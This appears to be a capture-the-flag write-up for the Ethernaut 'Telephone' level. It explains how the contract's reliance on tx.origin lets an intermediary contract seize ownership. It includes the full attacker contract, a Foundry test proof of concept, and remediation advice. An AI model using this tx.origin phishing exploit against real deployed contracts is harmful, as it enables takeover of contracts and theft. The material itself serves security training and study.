# Level 4 - Telephone

## Objectives

- claim ownership of the contract

## Contract Overview

The `Telephone` contract is checking if the caller is a smart contract.

A `Telephone` contract has one function `changeOwner` that is publicly visibile and which allows any smart
contract to change the owner of the `Telephone` contract.

The contract is supposed to work as follows:

- Contract validates condition that checks if the `tx.origin` is not equal to `msg.sender`.
- If condition is true, then sets the new owner to the address passed in the function arguments.

```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

## Finding the weak spots

The `changeOwner` is responsible for the critical action of changing ownership.
However, it is not protected by any security checks (like `onlyOwner` modifier).
It allows anyone to change the owner of the smart contract which is probably not
intended.

The `Telephone` contract relies on the `tx.origin` which is prone to
[phishing attacks](https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-usage-of-txorigin).
It might also be
[removed in the future](https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof/200#200),
which may result in compatibility issues.

The contract also does not emit events on
[the critical access control parameters](https://github.com/crytic/slither/wiki/Detector-Documentation#missing-events-access-control),
which makes it difficult to track the ownership changes off-chain.

In `Telephone` contract we have specific `tx.origin` that always refers to the original transaction sender.

Instead of using `tx.origin` we should always use `msg.sender`. The reason for that is `tx.origin` looks for full call chain and the owner can never be a contract while `msg.sender` looks for most recent call.

```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) { // <-- this line over here
      owner = _owner;
    }
  }
```

The function `changeOwner()` has public visibility which means that it can be called by anyone. It has a condition that checks if the `tx.origin` is not equal to `msg.sender`. If this is true, then sets the new owner to the address passed in the function arguments.

So to exploit this we just need to make sure that our `tx.origin` and `msg.sender` do not match when the instance receives the function call to `changeOwner()`.

To bypass this validation we can make use of a malicious intermediary contract (e.g: phishing attack) to call `changeOwner()` and pass the function checks.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Telephone_slither.png)

## Potential attack scenario (hypothesis)

Attacker can create a malicious intermediary contract that makes a call to the `Telephone` contract. This call invokes the `changeOwner()` function with attacker's address as an argument and changes the owner to attacker.

## Plan of the attack

1. Attacker creates the malicious contract with `attack()` function that makes a call to the `Telephone` contract.
2. This call (`attack()` function) invokes the `changeOwner()` function with attacker's address as an argument.
3. The ownership is claimed by attacker.

## Malicious contract (TelephoneAttack.sol)

Malicious contract has an `attack()` function that makes a call to the `Telephone` contract. This call invokes the `changeOwner()` function with attacker's address as an argument and changes the owner to attacker.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone victimContract;

    constructor(address _victimContractAddress) public {
        victimContract = Telephone(_victimContractAddress);
    }

    function attack() public {
        victimContract.changeOwner(msg.sender);
    }
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/04-Telephone.t.sol))

```solidity
        // Attacker creates the malicious contract with `attack()` function that makes a call to the `Telephone` contract
        TelephoneAttack telephoneAttack = new TelephoneAttack(levelAddress);

        emit log_named_address(
            "Owner of contract before attack: ",
            telephoneContract.owner()
        );

        // `attack()` function invokes the `changeOwner()` function with attacker's address as an argument
        emit log_string("Eve calls the attack function...");
        telephoneAttack.attack();

        // The ownership is claimed by attacker
        emit log_named_address(
            "Owner of contract after attack: ",
            telephoneContract.owner()
        );

        // Test assertion
        assertEq(telephoneContract.owner(), attacker);

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Telephone.png)

## Recommendations

1. The use of some form of access control is recommended. An example of that
   might be OpenZeppelin Ownable, which provides a basic access control mechanism
   or OZ AccessControl which provides role-based access control.
2. The use of `tx.origin` should be removed from the contract.
3. Emission of events should be added to the critical `changeOwner()` function.
   It will result in better communication with off-chain components and a better
   user experience overall.

## Additional information

You can also read my other solution (using Remix) on my blog: https://matrix-0wl.gitbook.io/ethernaut/4.-telephone-phising-with-tx.origin-used-instead-of-msg.sender

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
